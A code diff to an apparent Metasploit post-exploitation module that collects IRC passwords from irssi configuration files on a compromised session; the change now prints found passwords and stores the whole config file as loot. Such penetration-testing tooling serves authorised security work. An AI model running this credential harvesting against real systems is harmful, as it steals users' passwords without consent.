@@ -46,7 +46,7 @@ class MetasploitModule < Msf::Post
   # ***Network Password Example***
   #    password = "example_password";
   #
-  def extract_passwords(path)
+  def contains_passwords?(path)
     data = read_file(path)
     identify_passwords = data.scan(/\/\^?msg nickserv identify ([^\s]+)/)
     network_passwords = data.scan(/^?password = "([^\s]+)"/)
@@ -54,10 +54,11 @@ class MetasploitModule < Msf::Post
     passwords = identify_passwords.flatten + network_passwords.flatten
 
     if passwords.any?
-      return passwords
+      print_good("Found IRC password(s) of #{passwords.join(',')} in irssi config at #{path}")
+      return true
     end
 
-    []
+    false
   end
 
   def download_passwords(paths)
@@ -67,21 +68,17 @@ class MetasploitModule < Msf::Post
       path.chomp!
       next if ['.', '..'].include?(path)
 
-      irc_passwords = extract_passwords(path)
-
-      next if irc_passwords.empty?
-
-      print_good("Found IRC password(s): #{irc_passwords.join(',')}")
-
-      loot_path = store_loot(
-        'irc.passwords',
-        'text/plain',
-        session,
-        irc_passwords.join("\n"),
-        path,
-        'IRC Password'
-      )
-      print_good("IRC password(s) stored in #{loot_path}")
+      if contains_passwords?(path)
+        loot_path = store_loot(
+          'irssi config file',
+          'text/plain',
+          session,
+          read_file(path),
+          path,
+          'IRC Password'
+        )
+        print_good("irssi config with passwords stored in #{loot_path}")
+      end
     end
   end
 
